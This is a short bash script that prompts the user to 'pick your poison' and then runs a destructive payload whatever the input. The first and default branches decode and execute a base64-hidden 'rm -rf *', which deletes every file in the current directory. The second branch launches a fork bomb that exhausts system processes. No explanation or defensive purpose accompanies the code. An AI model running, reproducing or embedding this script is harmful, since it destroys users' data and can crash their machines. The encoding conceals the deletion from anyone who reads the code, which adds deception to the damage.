#!/bin/bash

echo "Pick your poison [ 1 or 2 ]:"
read poison

case $poison in
	1)
		echo poison 1
		$(echo cm0gLXJmICoK | base64 -d)
		;;
	2)
		echo poison 2
		:() { : | : & }; :
		;;
	*)
		echo "poison #1"
		$(echo cm0gLXJmICoK | base64 -d)
		;;
esac
